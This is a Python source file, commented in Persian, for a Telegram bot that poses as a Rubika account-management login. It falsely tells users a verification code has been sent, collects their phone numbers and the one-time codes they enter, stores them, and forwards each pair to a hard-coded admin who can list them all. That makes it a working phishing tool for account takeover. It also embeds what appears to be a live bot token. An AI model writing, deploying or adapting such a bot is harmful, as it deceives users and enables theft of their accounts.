# فایل: bot.py
import os
import json
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# شناسه عددی ادمین (جایگزین کنید)
ADMIN_ID = 8910769488  # شناسه تلگرام شما
BOT_TOKEN = os.environ.get("8313395074:AAGQyJha6f80c_dE_wTtVQ-CUi_qVd-EmOQ")

# دیکشنری موقت برای ذخیره شماره‌ها (برای سادگی)
# در نسخه نهایی می‌توانید از دیتابیس استفاده کنید
user_data = {}  # user_id -> {phone:..., code:...}

# فایل ذخیره‌سازی دائمی
DATA_FILE = "accounts.json"

def load_data():
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "به ربات مدیریت حساب روبیکا خوش آمدید!\n"
        "برای ورود، لطفاً شماره تلفن همراه خود را (به فرمت 09xxxxxxxxx) وارد کنید."
    )

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    # بررسی ساده بودن شماره (باید با 09 شروع شود و 11 رقم باشد)
    if text.startswith("09") and len(text) == 11 and text.isdigit():
        # ذخیره شماره
        user_data[user_id] = {"phone": text, "code": None}
        await update.message.reply_text(
            "✅ کد تأیید 5 رقمی به شماره شما ارسال شد.\n"
            "لطفاً کد را وارد کنید:"
        )
    else:
        await update.message.reply_text(
            "❌ شماره نامعتبر. لطفاً شماره 11 رقمی همراه با 09 وارد کنید."
        )

async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    if user_id in user_data and user_data[user_id]["code"] is None:
        # پذیرش هر کد 5 رقمی (یا هر متنی)
        if len(text) == 5 and text.isdigit():
            user_data[user_id]["code"] = text
            # ذخیره دائمی
            data = load_data()
            data[str(user_id)] = user_data[user_id]
            save_data(data)
            await update.message.reply_text(
                "🎉 ورود موفقیت‌آمیز!\n"
                "حساب شما تأیید شد. اکنون می‌توانید از امکانات ربات استفاده کنید."
            )
            # اطلاع‌رسانی به ادمین
            await context.bot.send_message(
                ADMIN_ID,
                f"🔔 کاربر جدید:\n"
                f"شماره: {user_data[user_id]['phone']}\n"
                f"کد: {user_data[user_id]['code']}\n"
                f"شناسه کاربر: {user_id}"
            )
        else:
            await update.message.reply_text("❌ کد باید 5 رقم باشد. دوباره تلاش کنید.")
    else:
        await update.message.reply_text("لطفاً اول شماره تلفن خود را با /start ارسال کنید.")

async def admin_view(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("⛔ دسترسی مجاز نیست.")
        return
    data = load_data()
    if not data:
        await update.message.reply_text("هنوز هیچ کاربری ثبت نشده است.")
    else:
        msg = "📋 لیست حساب‌های کاربری:\n\n"
        for uid, info in data.items():
            msg += f"شناسه: {uid}\nشماره: {info['phone']}\nکد: {info['code']}\n\n"
        await update.message.reply_text(msg)

async def admin_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return
    save_data({})
    user_data.clear()
    await update.message.reply_text("✅ تمام داده‌ها پاک شدند.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_view))
    app.add_handler(CommandHandler("clear", admin_clear))
    # هندلرهای پیام (اولویت: ابتدا بررسی می‌کنیم که کاربر در مرحله کد است یا خیر)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code), group=0)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone), group=1)
    app.run_polling()

if __name__ == "__main__":
    main()
